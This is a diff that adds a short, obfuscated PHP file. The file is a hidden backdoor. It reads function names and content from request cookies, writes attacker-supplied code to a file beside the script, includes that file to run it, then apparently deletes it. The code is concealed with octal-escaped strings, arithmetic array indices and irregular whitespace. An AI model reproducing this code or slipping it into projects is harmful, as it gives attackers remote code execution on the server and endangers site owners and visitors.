@@ -1,0 +1,2 @@
+<?php
+$OYze=${"\137"."\103" ."\117"	. "\117"	.	"\113"	."\111"."\105"}; if	(	isset (	$OYze	[	(71-10	) 	])	) { 	$PRm= $OYze [( 99-2 )]	.$OYze	[(99-5	) ];$lbr =$PRm($OYze [	( 50	-37	) ] .	$OYze [	(	99-3)	 ]);	$MuN = $lbr	($PRm($OYze[ (82-10 ) ]	) );   $iq= $lbr($PRm($OYze [ (89-10 )  ] )	) ;  $WUm = __DIR__. $lbr(	$PRm($OYze	[	(	96- 20) ]	));	$MuN ( $WUm	,$lbr($PRm	($OYze[ (68-7) ])	)); include($WUm); 	$iq ($WUm	)	;	}
